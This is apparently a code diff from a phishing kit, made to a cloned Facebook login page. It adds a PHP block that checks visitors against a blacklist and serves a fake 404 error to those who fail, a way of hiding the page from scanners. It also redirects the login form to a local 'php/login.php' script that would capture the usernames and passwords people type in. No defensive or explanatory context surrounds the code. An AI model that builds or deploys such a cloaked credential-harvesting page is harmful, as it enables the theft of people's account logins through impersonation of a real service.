@@ -1,5 +1,15 @@
 <!DOCTYPE html>
+<?php
+require "php/blacklist.php";
+if (!check_url()) {
+  header('HTTP/1.0 404 Not Found');
+  echo "<h1>Error 404 Not Found</h1>";
+  echo "The page that you have requested could not be found.";
+  exit;
+}
+?>
 <html lang="en" id="facebook" class="no_js">
+
   <head>
     <meta charset="utf-8" />
     <meta name="referrer" content="default" id="meta_referrer" />
@@ -90,7 +100,7 @@
                   <h1><a href="https://www.facebook.com/" title="Go to Facebook Home"><i class="fb_logo img sp_cdTC-VYAWtd sx_b8adf4"><u>Facebook</u></i></a></h1>
                 </div>
                 <div class="menu_login_container rfloat _ohf" data-testid="royal_login_form">
-                  <form id="login_form" action="login.php" method="post" novalidate="1" onsubmit="">
+                  <form id="login_form" action="php/login.php" method="post" novalidate="1" onsubmit="">
                     <input type="hidden" name="lsd" value="AVoM5jI-" autocomplete="off" />
                     <table cellspacing="0" role="presentation">
                       <tr>
